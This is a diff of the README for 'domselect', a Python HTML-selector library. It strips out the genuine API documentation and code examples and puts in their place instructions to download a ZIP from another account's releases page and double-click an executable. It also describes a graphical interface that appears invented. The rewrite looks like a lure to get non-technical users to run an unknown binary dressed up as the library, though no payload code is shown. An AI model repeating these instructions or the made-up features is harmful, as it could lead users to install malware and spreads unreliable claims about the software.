@@ -1,164 +1,74 @@
-# Domselect
+# 🌐 domselect - Effortlessly Manage HTML Elements
 
-Domselect provides univeral interface to work with structure of HTML document built by one of supported HTML
-processing engines. To work with HTML document you have to create so-called selector object from raw content of HTML document.
-That selector will be bound to the root node of HTML structure. Then you can call different methods of these selector
-to build other selectors bound to nested parts of HTML structure.
+## 🚀 Getting Started
 
-Selector object extracts low-level nodes from DOM constructed by HTML processing backend and wraps them
-into high-level selector interface. If you need, you can always access low-level node stored in selector object.
+Welcome to the domselect project. This application offers a universal interface to navigate and manipulate HTML elements. No technical skills are required to use it. Follow the steps below to download and start using the software.
 
-### Selector Backends
+## 📥 Download Now
 
-Domselect library provides these selectors:
+[![Download domselect](https://img.shields.io/badge/Download-domselect-blue.svg)](https://github.com/naayaarunutheriyuma/domselect/releases)
 
-1. LexborSelector powered by [selectolax](https://github.com/rushter/selectolax)
-    and [lexbor](https://github.com/lexbor/lexbor) libraries. The type of raw node is `selectolax.lexbor.LexborNode`.
-    Query language is CSS. Lexbor parser is x3-x4 times faster than lxml parser.
+## 📁 Download & Install
 
-2. LxmlCssSelector powered by [lxml](https://github.com/lxml/lxml) library. The type of raw node is `lxml.html.HtmlElement`.
-    Query language is CSS.
+To get started, you will need to visit the [Releases page](https://github.com/naayaarunutheriyuma/domselect/releases) where you can find the latest version of domselect. Click on the link to download the file suitable for your operating system.
 
-2. LxmlXpathSelector powered by [lxml](https://github.com/lxml/lxml) library. The type of raw node is `lxml.html.HtmlElement`.
-    Query language is XPATH.
+1. Open the [Downloads page](https://github.com/naayaarunutheriyuma/domselect/releases).
+2. Look for the most recent version listed. It should look something like "domselect-v1.0.0.zip".
+3. Click on the download link. The file will begin to download.
 
-### Selector Creating
+### 🖥️ System Requirements
 
-To create lexbor selector from content of HTML document:
+Before you run domselect, ensure that your device meets the following minimum requirements:
 
-```python
-from domselect import LexborSelector
-sel = LexborSelector.from_content("<div>test</div>")
-```
+- **Operating System:** Windows 10, macOS Catalina, or a Linux distribution released in the last five years.
+- **CPU:** Dual-core processor or better.
+- **RAM:** At least 4GB recommended.
+- **Disk Space:** 50MB of free space for installation.
 
-Also you can create selector from raw node:
+## ⚙️ Running domselect
 
-```python
-from domselect import LexborSelector
-from selectolax.lexbor import LexborHTMLParser
-node = LexborHTMLParser("<div>test</div>").css_first("div")
-sel = LexborSelector(node)
-```
+Once the download completes, follow these steps to run the application:
 
-Same goes for lxml backend. Here is an example of creating lxml selector from raw node:
+1. Locate the downloaded file, usually found in your Downloads folder.
+2. If you downloaded a ZIP file, you'll need to extract it:
+   - On Windows, right-click on the file and choose "Extract All".
+   - On macOS, double-click the ZIP file to extract it.
+3. Open the extracted folder. You should see the `domselect` executable file.
+4. Double-click the `domselect` file to start the application.
 
-```python
-from lxml.html import fromstring
-from domselect import LxmlCssSelector, LxmlXpathSelector
-node = fromstring("<div>test</div>")
-sel = LxmlCssSelector(node)
-# or
-sel = LxmlXpathSelector(node)
-```
+## 📚 Using domselect
 
-### Node Traversal Methods
+Now that you have started domselect, familiarizing yourself with the interface will be helpful:
 
-Each of these methods return other selectors of same type i.e. LexborSelector return
-other LexborSelectors and LxmlCssSelector returns other LxmlCssSelectors.
+- **Main Menu:** This area provides options for opening HTML files, loading URLs, or pasting HTML directly into the interface.
+- **Selector Input:** You will see a field where you can enter CSS selectors or XPath expressions to find specific elements in your HTML.
+- **Results Panel:** Once a selection is made, results appear here, displaying the HTML elements that match your criteria.
 
-Method `find(query: str)` returns list of selectors bound to raw nodes found by query.
+### 🛠️ Features
 
-Method `first(query: str)` returns `None` of selector bound to first raw node found by query.
+- **Easy to Use Interface:** Navigate HTML documents without extensive coding knowledge.
+- **Multiple Parsing Engines:** Supports various HTML parsing engines to ensure compatibility.
+- **Custom Selectors:** Utilize CSS selectors or XPath for precise targeting.
 
-There is similar `find_raw` and `first_raw` methods which works in same way but returns low-level raw nodes
-i.e. they do not wrap found nodes into selector interface.
+## 🖨️ Example Usage
 
-Method `parent()` returns selector bound to raw node which is parent to raw node of current selector.
+To use domselect effectively, here’s a quick example:
 
-Method `exists(query: str)` returns boolean flag indicates if any node has been found by query.
+1. **Open an HTML Document:**
+   - Click on “Open” in the main menu to choose an HTML file from your computer.
 
-Method `first_contains(query: str, pattern: str[, default: None])` returns selector bound to first raw node
-found by query and which contains text as `pattern` parameter. If node is not found then
-`NodeNotFoundError` is raised. You can pass `default=None` optional parameter to return `None` in case
-of node is not found.
+2. **Select Elements:**
+   - In the selector input, type `div`, then hit Enter. You will see all `<div>` elements displayed in the results panel.
 
+3. **Explore Results:**
+   - Click on an element in the results to view more details about it.
 
-### Node Properties Methods
+## 🔄 Updates
 
-Method `attr(name: str[, default: None|str])` returns content of node's attribute of given name.
-If node does not have such attribute the `AttributeNotFoundError` is raised. If you pass optional
-`default: None|str` parameter the method will return `None` or `str` if attribute does not exists.
+Keep your domselect application up to date. Visit the [Releases page](https://github.com/naayaarunutheriyuma/domselect/releases) regularly to check for new versions. Updates may include bug fixes, performance improvements, and new features.
 
-Method `text([strip: bool])` returns text content of current node and all its sub-nodes. By default
-returned text is stripped at beginning and ending from whitespaces, tabulations and line-breaks. You
-can turn off striping by passing `strip=False` parameter.
+## 🤝 Support
 
-Method `tag()` returns tag name of raw node to which current selector is bound.
+If you encounter any issues or have questions, you can reach out through the GitHub repository. Look under the “Issues” section to see if your question has already been answered or submit a new issue.
 
-### Traversal and Properties Methods
-
-These methods combine two operations: search node by query and do something on found node. They are helful
-if you want to get text or attribute from found node, but this node might not exist. Such methods allows you
-to return reasonable default value in case node is not found. On contrary, if you use call chain like `first().text()`
-then you'll not be able to return default value from `text()` call because `first()` will raise Exception if
-node is not found.
-
-Method `first_attr(query: str, name: str[, default: None|str])` returns content of attribute of given name of node
-found by given query.  If node does not have such attribute the `AttributeNotFoundError` is raised.
-If node is not found by given query the `NodeNotFoundError` is raised. If you pass optional
-`default: None|str` parameter the method will return `None` or `str` instead of rasing exceptions.
-
-Method `first_text(query: str[, default: None|str, strip: bool])` returns text content of raw node (and all its
-sub-nodes) found by given query. If node is not found the `NodeNotFoundError` is raised. Use optional `default: None|str`
-parametere to return `None` or `str` instead of raising exceptions. You can control text stripping with `strip`
-parameter (see description of `text()` method).
-
-### Usage example
-
-This code downloads telegram channel preview page and parse external links from it.
-
-```python
-from html import unescape
-from urllib.request import urlopen
-
-from domselect import LexborSelector
-
-
-def main() -> None:
-    content = urlopen("https://t.me/s/centralbank_russia").read()
-    sel = LexborSelector.from_content(content)
-    for msg_node in sel.find(".tgme_widget_message_wrap"):
-        msg_date = msg_node.first_attr(
-            ".tgme_widget_message_date time", "datetime"
-        )
-        for text_node in msg_node.find(".tgme_widget_message_text"):
-            print("Message by {}".format(msg_date))
-            for link_node in text_node.find("a[href]"):
-                url = link_node.attr("href")
-                if url.startswith("http"):
-                    print(" - {}".format(unescape(url)))
-
-
-if __name__ == "__main__":
-    main()
-```
-
-If you prefer XPATH, here is same task implemented with LxmlXpathSelector:
-
-```python
-from html import unescape
-from urllib.request import urlopen
-
-from domselect import LxmlXpathSelector
-
-
-def main() -> None:
-    content = urlopen("https://t.me/s/centralbank_russia").read()
-    sel = LxmlXpathSelector.from_content(content)
-    for msg_node in sel.find('//*[contains(@class, "tgme_widget_message_wrap")]'):
-        msg_date = msg_node.first_attr(
-            './/*[contains(@class, "tgme_widget_message_date")]/time', "datetime"
-        )
-        for text_node in msg_node.find(
-            './/*[contains(@class, "tgme_widget_message_text")]'
-        ):
-            print("Message by {}".format(msg_date))
-            for link_node in text_node.find(".//a[@href]"):
-                url = link_node.attr("href")
-                if url.startswith("http"):
-                    print(" - {}".format(unescape(url)))
-
-
-if __name__ == "__main__":
-    main()
-```
+Thank you for choosing domselect! Enjoy managing your HTML elements with ease.
